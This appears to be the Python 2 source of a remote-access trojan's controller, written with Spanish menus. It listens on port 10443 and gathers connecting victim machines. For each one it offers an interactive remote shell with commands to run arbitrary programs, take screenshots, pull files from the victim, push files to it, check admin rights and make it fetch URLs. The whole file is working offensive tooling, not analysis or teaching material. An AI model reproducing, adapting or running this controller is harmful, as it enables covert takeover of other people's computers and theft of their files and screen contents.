#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import base64
import select
import os
from socket import error
from threading import Thread
import time

class Shell_Thread(Thread):

    def __init__(self,sockfd, data, IP_CLIENTE):

        Thread.__init__(self)

        self.sockfd = sockfd
        self.data = data
        self.IP_CLIENTE = IP_CLIENTE

    def run(self):
        print ("Pasamos a shell")
        shell(self.sockfd,self.data, self.IP_CLIENTE)
        #self.sockfd.close()

class Servidor():

    def __init__(self):

        self.SOCKET_LIST = []
        self.CONN_LIST = {}
        self.server_socket= None
        self.logo = """
       
            ..- '"'" '- ..
        . '' ''.
        , '/ \',
    / / | \ '\'
    ': | : '
    ', "". \ | /, "". '
    : (* \: |: / *):
    El | \,. \ \ | / /,. / |
    : '' ======= '':
    ; .. ', / | \.' ..;
    . '-. ": |:" .-'.
    \ \ / /
        ',', '
        '. . '
            '-..- apc -..-'
            - '' -       
        
        """

    def Start(self):
        os.system("cls")
        print ("    ***   LEVANTANDO EL SERVIDOR   ***")
        print self.logo
        ip = str(raw_input("Introcude la IP del servidor --> "))
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((ip, 10443))
        self.server_socket.listen(10)
        self.SOCKET_LIST.append(self.server_socket)
        print "Servidor escuchando on port " + str(10443)
        print ("\n SOCKET EN LISTA:  {}".format(len(self.SOCKET_LIST)))
        print ("\n CLIENTES CONECTADOS:  {}".format(len(self.CONN_LIST.keys())))

    def RecopilaConexiones(self):    
        os.system("cls")
        print "    ***   RECOPILANDO CONEXIONES   ***"
        print self.logo + '\n'
        tCurrent = time.time()

        while time.time() <= tCurrent + 5:
            time.sleep(1)
            ready_to_read,ready_to_write,in_error = select.select(self.SOCKET_LIST,[],self.SOCKET_LIST,0)
            del ready_to_write, in_error
            for sock in ready_to_read:
                #print ("sock objeto iterado {}".format(sock))
                if sock == self.server_socket:
                    # a new connection request recieved
                    sockfd, addr = self.server_socket.accept()
                    #print ("sock conectado: {}".format(sockfd))
                    self.SOCKET_LIST.append(sockfd)
                    self.CONN_LIST[str(addr[0])] = (sockfd,addr)
                    print "Client (%s, %s) connected" % addr
        print ("\n SOCKET EN LISTA:  {}".format(len(self.SOCKET_LIST)))
        print ("\n CLIENTES CONECTADOS:  {}".format(len(self.CONN_LIST.keys())))
        return self.CONN_LIST

    def ConectarCliente(self, socket_cliente, IP_CLIENTE):
        os.system("cls")
        print ("    ***   INICIO DE SESION CON CLIENTE   ***")
        print self.logo + '\n      DESTINO --> ' + IP_CLIENTE + '\n'
        print ("Iniciamos conexion con cliente")
        socket_cliente.send("carpeta")
        carp_actual = socket_cliente.recv(2048)
        print ("Tenemos directorio de cliente")
        hilo_shell = Shell_Thread(socket_cliente,carp_actual,IP_CLIENTE)
        print ("Iniciamos hilo...")
        hilo_shell.start()
        hilo_shell.join()
        return

    def CerrarClientes(self,cte=None):
        os.system("cls")
        print ("    ***   CERRANDO CLIENTES   ***")
        print self.logo + '\n'
        if cte == None:
            for cte in self.CONN_LIST.keys():
                try:
                    self.CONN_LIST[cte][0].close()
                    print ("\n Cliente cerrado: {}".format(cte))
                    self.SOCKET_LIST.remove(self.CONN_LIST[cte][0])
                    del self.CONN_LIST[cte]
                    
                except:
                    continue
        else:
            self.CONN_LIST[cte][0].close()
            self.SOCKET_LIST.remove(self.CONN_LIST[cte][0])
            del self.CONN_LIST[cte]            

        print ("\n SOCKET EN LISTA:  {}".format(len(self.SOCKET_LIST)))
        print ("\n CLIENTES CONECTADOS:  {}".format(len(self.CONN_LIST.keys())))
        return self.CONN_LIST

    def Close(self):
        self.server_socket.close()
        del self.SOCKET_LIST

def descarga_archivo(target,archivo_descarga):
    target.settimeout(5)
   
    try:
        with open(archivo_descarga,'wb') as file:
            print "Recibiendo..."
            while True:
                porcion = target.recv(4)
                file.write(base64.b64decode(porcion))
                #print ("Porcion escrita: {}".format(len(porcion)))
                    
    except socket.error, e:
        if e[0] == 'timed out':
            print ("Tenemos archivo")
            return
    except:
        print ("Error de socket")
        return

def envio_archivo (target, archivo_subir):
    with open(archivo_subir,'rb') as file:
        print ("Abrimos archivo")
        data = file.read(4)
        print ("Enviando...")
        try:
            while data:
                target.send(base64.b64encode(data))
                #print ("Porcion enviada..{}".format(len(data)))
                # time.sleep(0.5)
                data = file.read(4)
                #print ("Pordicon leida {}".format(len(data)))
                #print(type(data))
                if len(data) == 0:
                    #cliente.send("")
                    print ("len(data) = 0 retornamos")
                    file.close()
                    return
                else:
                    continue
        except:
            print ("Error en el envío retornando")
            file.close()
            return

def shell(target,carp_actual,IP_CLIENTE):
    a = 0
    
    #carp_actual = target.recv(2048)

    while True:
        comando = ""
        comando = raw_input('\n' +'        IP:  '+ IP_CLIENTE + '\n' + ' -------------------------- {}-#: '.format(carp_actual))
        target.settimeout(None)
        if comando == "exit":
            #target.send(comando)
            break

        elif comando[:4] == 'help':
            print('\nadmin --> Para saber si somos usuario admin')
            print('captura --> Para tomar captura de pantalla en cte')
            print('get --> Descarga archivo desde una url OJO indicar url completa https://...')
            print('exit --> Finaliza cte hasta reinicio :(')
            print('rebota --> reinicia cte sin salirse')
            print('download --> Descarga archivo local de cte')
            print('upload --> Sube archivo local a cte')
            print('ejecuta --> Ejecuta un comando en cte sin almacenarlo en variable\n')

        elif comando[:7] == 'carpeta':
            target.send(comando)
            carp_actual = target.recv(2048)
            
        elif comando[:2] == 'cd':
            target.send(comando)
            res = target.recv(2048)
            if res[:11] == "El sistema":
                print("El sistema no pudo encontrar la ruta")
            else:
                carp_actual = res
                #print(res)
        
        elif comando == "":
            pass
        
        elif comando[:8] == 'download':
            target.send(comando)
            descarga_archivo(target,comando[9:])
            target.settimeout(None)
            print("Ya en shell.")
        
        elif comando[:6] == 'upload':
            if os.path.isfile(comando[7:]):
                target.send(comando)
                envio_archivo(target, comando[7:])
                print("Regresamos a Shell")
            else:
                print "No existe el archivo"
        
        elif comando[:7] == 'captura':
            target.send(comando)
            archivo_descarga = "pantalla.%d.png" %a
            descarga_archivo(target,archivo_descarga)
            a = a +1
            target.settimeout(None)
            print("Ya en shell.")
            
        else:
            target.send(comando)
            target.settimeout(5)
            buf = ""
            try:
                print "Recibimos repuesta"
                while True:
                    res = target.recv(4)
                    buf = buf + res
            
            except socket.error, e:
                if e[0] == 'timed out':
                    if buf == '1':
                        print "No se puede ejecutar el comando"
                        continue
                    else:
                        print(buf)
                        continue
                else:
                    print ("Error de socket")
                    continue

def Consola():
    
        CONN_LIST = {}
        os.system("cls")
        logo_ = """
        
    BIENVENIDO A LA CONSOLA DE INICIO MANOLO

            ..- '"'" '- ..
        . '' ''.
        , '/ \',
    / / | \ '\'
    ': | : '
    ', "". \ | /, "". '
    : (* \: |: / *):
    El | \,. \ \ | / /,. / |
    : '' ======= '':
    ; .. ', / | \.' ..;
    . '-. ": |:" .-'.
    \ \ / /
        ',', '
        '. . '
            '-..- apc -..-'
            - '' -       
        
        """
        servidor = Servidor()
        servidor.Start()
        RESULTADO = "Servidor Iniciado"

        while True:
            print ('\n' + 'ULTIMO COMANDO EJECUTADO --> ' +RESULTADO)
            print ("\n Opcion 1 --> Iniciar / Reiniciar Servidor")
            print (" Opcion 2 --> Anadir / refrescar clientes de la lista")
            print (" Opcion 3 --> Conectar con un cliente")
            print (" Opcion 4 --> Cerrar todos los clientes")
            print (" Opcion 9 --> Salir")
            OPCION = raw_input("\n Eligue una opcion --> ")
            if OPCION == "1":
                servidor = Servidor()
                servidor.Start()
                RESULTADO = "Servidor Iniciado"

            elif OPCION == "4":
                CONN_LIST = servidor.CerrarClientes(cte = None)
                RESULTADO = "Clientes cerrados utiliza OPC 2"
                #print ("Clientes en la lista: {}".format(len(CONN_LIST.keys())))

            elif OPCION == "2":
                CONN_LIST = servidor.RecopilaConexiones()
                #print ("Lista tipo: {}".format(type(CONN_LIST)))
                #RESULTADO = "Clientes conectados"
                RESULTADO = "CLIENTES RECOPILADOS"

            elif OPCION == "3":
                if len(CONN_LIST.keys()) == 0:
                    print ("\n No hay clientes utiliza OPC 2")
                    continue
                print ("\n CLIENTES DISPONIBLES: ")
                for cte in CONN_LIST.keys():
                    print ("\n Cliente --> (%s, %s)" %CONN_LIST[cte][1])
                CTE_ELEGIDO = raw_input("\n Elige la ip de un cliente: ")

                #try:
                if CTE_ELEGIDO in CONN_LIST.keys():
                    try:
                        servidor.ConectarCliente(CONN_LIST[CTE_ELEGIDO][0],CONN_LIST[CTE_ELEGIDO][1][0])
                        os.system("cls")
                        print logo_ + '\n'
                        RESULTADO = "FIN DE SESION CON CLIENTE --> " + CONN_LIST[CTE_ELEGIDO][1][0]
                    except:
                        CONN_LIST = servidor.CerrarClientes(CTE_ELEGIDO)
                        RESULTADO = "Cliente {} no responde eliminado de la lista".format(CTE_ELEGIDO)
                else:
                    RESULTADO = "** ERROR Opc3 + IP CORRECTA..."

            elif OPCION == "9":
                if len(CONN_LIST.keys()) == 0:
                    servidor.Close()
                    
                else:
                    CONN_LIST = servidor.CerrarClientes()
                    servidor.Close()

                print ("Servidor cerrado saliendo...")
                return False
            else:
                print ("Por favor elige una opcion valida...")

def main():

    Consola()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
